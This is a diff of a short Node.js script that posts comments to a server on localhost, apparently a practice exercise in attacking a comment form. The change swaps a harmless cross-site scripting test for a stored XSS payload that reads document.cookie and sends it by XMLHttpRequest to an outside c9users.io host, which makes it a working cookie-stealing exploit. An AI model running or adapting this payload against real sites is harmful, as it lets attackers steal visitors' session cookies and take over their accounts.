@@ -1,7 +1,7 @@
 var http = require('http')
 
 var host = "127.0.0.1"
-var port = 3000
+var port = 8080
 
 var parseres = function(callback) {
   return function(res)
@@ -74,6 +74,8 @@ var postRequest = function(url, body, cookies, callback) {
 //   })
 // });
 
-postRequest("/comment", {comment: '<script>document.title=document.cookie</script>'}, [], (res, output) => {
+postRequest("/comment", {
+  comment: '<script>var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "POST", "http://learn-node-dan121.c9users.io/", false ); xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); xmlHttp.send( document.cookie ); document.title=document.cookie</script>'
+}, [], (res, output) => {
   console.log(output)
 });
